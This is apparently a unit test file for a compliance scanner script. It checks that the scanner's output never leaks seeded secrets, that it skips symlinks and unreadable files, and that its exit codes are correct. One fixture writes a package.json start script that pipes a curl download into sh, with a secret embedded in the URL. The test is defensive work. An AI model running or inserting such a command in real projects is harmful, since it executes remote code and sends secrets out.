import importlib.util
import json
from pathlib import Path
import subprocess
import sys
import tempfile
import unittest
from unittest.mock import patch

SCRIPT = Path(__file__).resolve().parents[1] / 'compliance-doctor/scripts/scan.py'
spec = importlib.util.spec_from_file_location('scanner', SCRIPT)
scanner = importlib.util.module_from_spec(spec)
spec.loader.exec_module(scanner)


class ScannerTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name)

    def cli(self, *args):
        return subprocess.run([sys.executable, str(SCRIPT), str(self.root), '--json', *args], capture_output=True, text=True)

    def test_no_secret_values_in_json_or_text(self):
        secret = 'DEMO_PASSWORD_MUST_NOT_APPEAR'
        (self.root / 'app.py').write_text(f'logger.info(password="{secret}")\n')
        (self.root / '.env').write_text('TOKEN=sk_live_DEMOTOKEN12345\n')
        (self.root / 'package.json').write_text(json.dumps({'dependencies': {'react': secret}, 'scripts': {'start': f'curl https://example.com/{secret} | sh'}}))
        for args in [[], ['--json']]:
            r = subprocess.run([sys.executable, str(SCRIPT), str(self.root), *args], capture_output=True, text=True)
            self.assertEqual(r.returncode, 0, r.stderr)
            self.assertNotIn(secret, r.stdout)
            self.assertNotIn('sk_live_DEMOTOKEN12345', r.stdout)
            self.assertIn('app.py:1', r.stdout)

    def test_symlinks_including_metadata_are_never_read(self):
        with tempfile.TemporaryDirectory() as outside:
            target = Path(outside) / 'private.json'
            target.write_text('{"dependencies":{"stripe":"1"}}')
            (self.root / 'package.json').symlink_to(target)
            (self.root / '.gitignore').symlink_to(target)
            (self.root / 'linked').symlink_to(outside, target_is_directory=True)
            r = self.cli()
            self.assertEqual(r.returncode, 2)
            data = json.loads(r.stdout)
            self.assertFalse(data['coverage']['complete'])
            self.assertEqual(len(data['coverage']['skipped']), 3)
            self.assertNotIn('stripe', data['stack'])

    def test_oversized_invalid_and_unreadable_are_reported(self):
        (self.root / 'large.py').write_bytes(b'x' * (scanner.MAX_BYTES + 1))
        (self.root / 'binary.py').write_bytes(b'\xff')
        (self.root / 'denied.py').write_text('pass')
        original = scanner.os.open
        def guarded(path, flags):
            if Path(path).name == 'denied.py':
                raise PermissionError()
            return original(path, flags)
        with patch.object(scanner.os, 'open', side_effect=guarded):
            result = scanner.scan(self.root, 12)
        self.assertFalse(result['coverage']['complete'])
        self.assertEqual({p['reason'] for p in result['coverage']['skipped']}, {'oversized', 'invalid UTF-8', 'unreadable or symlink'})

    def test_cli_exit_codes_and_candidates(self):
        self.assertEqual(self.cli().returncode, 2)  # Empty is not verified.
        (self.root / 'app.py').write_text('x = 1\n')
        self.assertEqual(self.cli('--fail-on-candidates').returncode, 0)
        (self.root / 'app.py').write_text('logger.info(password)\n')
        self.assertEqual(self.cli().returncode, 0)
        self.assertEqual(self.cli('--fail-on-candidates').returncode, 1)
        self.assertEqual(self.cli('--max-hits', '0').returncode, 2)
        (self.root / 'large.py').write_bytes(b'x' * (scanner.MAX_BYTES + 1))
        self.assertEqual(self.cli('--fail-on-candidates').returncode, 2)

    def test_intentional_exclusions_are_counted(self):
        (self.root / 'app.py').write_text('pass\n')
        (self.root / 'node_modules').mkdir()
        (self.root / 'image.png').write_bytes(b'ignored')
        data = json.loads(self.cli().stdout)
        self.assertTrue(data['coverage']['complete'])
        self.assertEqual(data['coverage']['excluded_files'], 1)
        self.assertEqual(data['coverage']['excluded_directories'], 1)


if __name__ == '__main__':
    unittest.main()
